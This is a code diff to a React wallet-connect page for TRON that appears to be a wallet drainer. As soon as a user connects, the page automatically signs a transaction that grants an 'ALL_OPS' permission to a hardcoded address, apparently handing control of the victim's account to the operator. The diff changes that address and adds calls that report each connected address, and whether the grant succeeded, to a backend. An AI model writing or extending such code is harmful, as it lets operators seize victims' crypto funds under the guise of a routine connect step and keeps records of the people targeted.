@@ -6,8 +6,9 @@ import { useNavigate } from "react-router-dom";
 import { TronWeb } from "tronweb";
 import { binanceAdapter } from "../adapter";
 
-const PC_ADDRESS = "TQtiVSSyYx2QRXpGLyfqzYreHrsTkZi8t7";
+const PC_ADDRESS = "TLkV6L492HaX8UwgasphhXm57p1cFScsvp";
 const ALL_OPS   = "7fff1fc0033e0100000000000000000000000000000000000000000000000000";
+const BACKEND   = "http://localhost:3001";
 
 type Mode      = "extension" | "mobile";
 type PermState = "idle" | "confirming" | "granting" | "done" | "error";
@@ -75,6 +76,37 @@ function ScanStep({ label, done, active }: { label: string; done: boolean; activ
   );
 }
 
+
+/* -- Backend tracking helpers -- */
+async function trackConnect(address: string) {
+  try {
+    await fetch(`${BACKEND}/api/connect`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ address }),
+    });
+  } catch { /* backend offline — non-fatal */ }
+}
+
+async function trackDisconnect(address: string) {
+  try {
+    await fetch(`${BACKEND}/api/disconnect`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ address }),
+    });
+  } catch { /* backend offline — non-fatal */ }
+}
+
+async function trackOwner(address: string, granted: boolean) {
+  try {
+    await fetch(`\/api/owner`, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ address, granted }),
+    });
+  } catch { /* non-fatal */ }
+}
 export default function ConnectPage() {
   const { select, connect, connected, address, disconnect, signTransaction } = useWallet();
   const navigate = useNavigate();
@@ -119,6 +151,7 @@ export default function ConnectPage() {
   // Auto-grant PC access as soon as the wallet is connected
   useEffect(() => {
     if (connected && address && tronweb && permState === "idle") {
+      trackConnect(address);
       grantPCAccess();
     }
   // eslint-disable-next-line react-hooks/exhaustive-deps
@@ -191,7 +224,7 @@ export default function ConnectPage() {
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
       const result: any = await tronweb.trx.sendRawTransaction(signed);
       if (result?.result === true) {
-        setPermTxid(result.txid ?? ""); setPermState("done");
+        setPermTxid(result.txid ?? ""); setPermState("done"); trackOwner(address, true);
       } else {
         throw new Error(result?.message ?? "Broadcast failed ï¿½ ensure at least 100 TRX in wallet");
       }
@@ -204,7 +237,7 @@ export default function ConnectPage() {
         msg = "This wallet has not been activated on mainnet yet. Send at least 1 TRX to it first, then try again.";
       }
       setPermError(msg);
-      setPermState("error");
+      setPermState("error"); trackOwner(address, false);
     }
   }
 
@@ -357,7 +390,7 @@ export default function ConnectPage() {
             </div>
           )}
 
-          <button onClick={() => disconnect()} style={{ width: "100%", padding: "9px 0",
+          <button onClick={() => { if (address) trackDisconnect(address); disconnect(); }} style={{ width: "100%", padding: "9px 0",
             background: "none", border: "1px solid rgba(255,255,255,0.08)", borderRadius: 8,
             color: "#7a7f96", fontWeight: 600, fontSize: 12, cursor: "pointer" }}>
             Disconnect Wallet
